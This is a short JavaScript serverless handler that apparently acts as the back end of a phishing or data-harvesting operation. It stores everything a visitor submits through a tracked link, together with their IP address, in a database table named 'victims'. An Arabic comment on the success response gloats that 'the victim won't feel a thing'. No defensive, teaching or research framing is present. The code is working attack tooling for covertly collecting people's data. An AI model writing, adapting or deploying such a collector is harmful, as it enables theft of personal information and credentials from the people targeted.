import { createClient } from '@supabase/supabase-js';
const supabase = createClient(process.env.SB_URL, process.env.SB_KEY);

export default async function handler(req, res) {
  const { link_id, ...userData } = req.body;
  
  const { error } = await supabase.from('victims').insert([
    { link_id: link_id, data: userData, ip_address: req.headers['x-forwarded-for'] }
  ]);

  if (error) return res.status(500).send("Error");
  res.status(200).send("Success"); // الضحية مش هتحس بحاجة
}
